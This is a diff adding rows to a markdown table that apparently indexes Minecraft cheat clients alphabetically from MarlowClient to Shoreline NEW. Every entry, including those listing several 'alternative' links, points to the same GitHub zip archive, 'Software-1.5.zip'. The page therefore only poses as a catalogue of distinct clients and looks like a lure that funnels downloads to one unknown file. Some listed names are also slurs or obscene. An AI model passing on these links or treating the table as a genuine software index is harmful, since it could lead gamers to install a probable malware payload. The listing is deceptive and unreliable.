+| MarlowClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MasterMind | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MatHax              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MawouteClient       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| MayhemClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| MaywrWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| McDonald            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MClient++ / MClientPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| MCPClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MedusaWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Melon | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MelodySky | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MelonHack+ / MelonHackPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| MemeWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MeowHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Mercury             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mercury Pro | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Meteor              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Meteor+ / MeteorPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| MethodClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| MetteroV2           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Miku                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Minced              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip(1.12.2) |
+| Minced 1.20.4 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mint                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| MinusBounce | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mio | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip | 
+| Mio (Free) | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mirai               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Misericordia | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Moloch.su           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Momentum            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| MoneyMod+2 / MoneyModPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip     |
+| MoneyMod+3 / MoneyModPlusThree | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MonkeClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MonkeyClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| MonSoon             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Moon                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| MoonGod | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Moonlight | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Moonlight           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Moonlight           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Moonlight (Meadows) | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Moonlight  1.8.9 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MoonWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip(1.12.2) |
+| Morgen.cc           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| MotClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mousse              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Muffin              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Mushroom | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Myau | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MythClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Nadia | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Namida              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NanoSense           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| NClient             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nebula              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Neko+ / NekoPlus    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Neptune | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Neptunium           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Neutron             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| NeverBuy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Neverdies | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NeverHook           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NextifyQristo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nexus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nexus Edge | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nhack               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| NHack3              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nhack4              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| NiggaHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| NightClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NightWare+ / NightWarePlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NightX              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| NineHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Noat Wurst+2 / Noat WurstPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NobleSix            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NoobHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Norsa               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Norules             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| NotEnoughtCoins Premium / NEC Premium | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Notorious           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| November | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Novoline            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NullHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NullPoint | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Nursultan           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| North | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NutGod.CC           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| NyaHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| OakClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Oasis | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ObamaHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Oblivion            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| OctoHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Omega               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| OmegaHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| OmegaHack Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| OnePop              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Onigiri             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Onyx | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Opal | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Opium | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Orangette           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ORH | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Oringo              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Orion               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Osiris              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Osiris+ / OsirisPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Outrage             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Ovaq Reborn | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Ovaq RebornPlus / Ovaq Reborn+ | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Override            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| OwnedWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| OyVey               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| OyVey+ / OyVeyPlus  | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| OyVey Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Ozark               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| PandoraHack         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Paragon             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Past                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| PastiqueV2 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Penguin             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| PepsiMod            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| PerryPhobos         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| PGz                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Phantom | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Phasma | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Phobos              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Phobos Lite         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| PhoboxNotGay        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| PigHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| PikaHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| PistonClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Pizza               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| PocketClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| PollosHook | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| PornoClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Postamn++ / PostmanPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Postman             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Prestige | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Pride+ / PridePlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Proactive           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Progreso | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ProtoHax            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Proton              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| PubDLC | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Pulse | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Pulsive             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| PureHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Pyro                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Quantum             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Quantum Continued   | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Qubit | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Qusar               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| QweruHax | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Radeon              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rage                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| RailHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rainbow             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip     |
+| Raion               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RatWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RavenB- / RavenBMinus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Raven B+ / RavenBPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Raven B++ / RavenBPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Raven B+++ / RavenBPlusPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Raven BS | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Raven BS Alpha | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Raven N+ / RavenNPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Raven O++ / RavenOPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Raven XD | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RavenWeave          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Razmorozka          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Reach Premium       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Reaper              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Rebirth             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rebirth 1.20.1 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rebirth Alpha | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rebirth Nextgen | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| reDACTED | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ReflectionClient    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Remnant | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RenoSense           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| RenoSenseTwo        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip  |
+| RerHack.club        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Resilience          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Revenge             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| Reverse             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Reznya              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Rift                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip     |
+| Rich                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rise                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Rocan               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RockEZHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| RockStar            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| RoseGold            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Ruby                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Ruhama              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Ruhama+             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| RusherHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| RussianWare         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Rustme              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SafePoint.club / SafePointClub | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| SafePoint+2 / SafePointPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Salhack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| SalHackSkid         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Salt                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Satellite           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Saturn              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Saturn / EsoHack Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Schizoid | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Scrim | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Selene              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Seppuku             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Serenity            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| SerenityCE          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| SeturHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| SevCheat            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| SexHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| SexMaster.cc        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Shadow              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| ShafferHack         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ShellSock           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| SHGR                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Shid | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Shimeji | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Shoreline | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Shoreline NEW | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
